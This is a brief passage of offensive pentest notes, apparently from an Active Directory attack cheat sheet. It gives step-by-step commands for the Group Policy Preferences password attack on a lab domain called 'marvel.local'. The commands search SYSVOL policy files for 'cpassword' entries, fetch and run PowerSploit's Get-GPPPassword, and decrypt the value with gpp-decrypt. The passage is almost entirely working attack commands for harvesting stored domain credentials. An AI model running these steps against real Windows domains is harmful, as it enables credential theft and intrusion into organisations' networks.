- - -
Attacking Steps ( **1** ) :

```powershell
PS> findstr /S /I cpassword \\marvel.local\sysvol\marvel.local\policies\*.xml
```

Download [Get-GPPPassword.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1)

```powershell
PS> Get-GPPPassword
```

Or we can also decode it on our kali : 

```python
gpp-decrypt <encrypted_cpassword>
```

- - -

